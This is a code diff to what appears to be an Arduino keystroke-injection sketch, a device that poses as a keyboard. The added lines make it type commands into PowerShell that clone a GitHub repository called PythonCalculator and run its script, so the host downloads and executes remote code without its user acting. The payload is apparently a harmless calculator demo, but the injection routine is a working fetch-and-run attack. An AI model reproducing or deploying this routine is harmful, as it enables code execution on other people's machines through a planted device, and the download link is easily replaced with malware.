@@ -18,7 +18,32 @@ delay(1000);
 keyboard.println("powershell");
 keyboard.pressSpecialKey(ENTER);
 keyboard.releaseKey();
+delay(1000);
+
+keyboard.pressSpecialKey(ALT);
+keyboard.releaseKey();
+keyboard.pressSpecialKey(ENTER);
+keyboard.releaseKey();
+
+delay(1000);
+keyboard.println("git clone https://github.com/Seripxx/PythonCalculator.git");
+keyboard.pressSpecialKey(ENTER);
+keyboard.releaseKey();
+
+delay(5000); //wait for repository to be cloned
+
+keyboard.println("cd PythonCalculator");
+keyboard.pressSpecialKey(ENTER);
+keyboard.releaseKey();
+
+keyboard.println("./calculator.py");
+keyboard.pressSpecialKey(ENTER);
+keyboard.releaseKey();
+keyboard.pressSpecialKey(ENTER);
+keyboard.releaseKey();
+
 }
+
 
 void loop() {
   // put your main code here, to run repeatedly:
